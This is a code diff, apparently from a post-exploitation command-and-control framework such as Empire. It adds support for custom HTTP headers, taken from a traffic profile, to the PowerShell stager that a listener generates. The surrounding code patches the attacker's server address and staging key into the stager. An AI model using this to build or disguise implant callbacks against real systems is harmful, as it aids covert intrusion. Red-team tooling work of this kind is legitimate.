@@ -303,6 +303,7 @@ class Listener:
         stagingKey = listenerOptions['StagingKey']['Value']
         host = listenerOptions['Host']['Value']
         workingHours = listenerOptions['WorkingHours']['Value']
+        customHeaders = profile.split('|')[2:]
         
         # select some random URIs for staging from the main profile
         stage1 = random.choice(uris)
@@ -318,6 +319,22 @@ class Listener:
             # make sure the server ends with "/"
             if not host.endswith("/"):
                 host += "/"
+
+            #Patch in custom Headers
+            headers = ""
+            if customHeaders != []:
+                crlf = False
+                for header in customHeaders:
+                    headerKey = header.split(':')[0]
+                    headerValue = header.split(':')[1]
+
+                    # Host header TLS SNI logic done within http_com.ps1
+                    if crlf:
+                        headers += "`r`n"
+                    else:
+                        crlf = True
+                    headers += "%s: %s" % (headerKey, headerValue)
+                stager = stager.replace("$customHeaders = \"\";","$customHeaders = \""+headers+"\";")
 
             # patch the server and key information
             stager = stager.replace('REPLACE_SERVER', host)
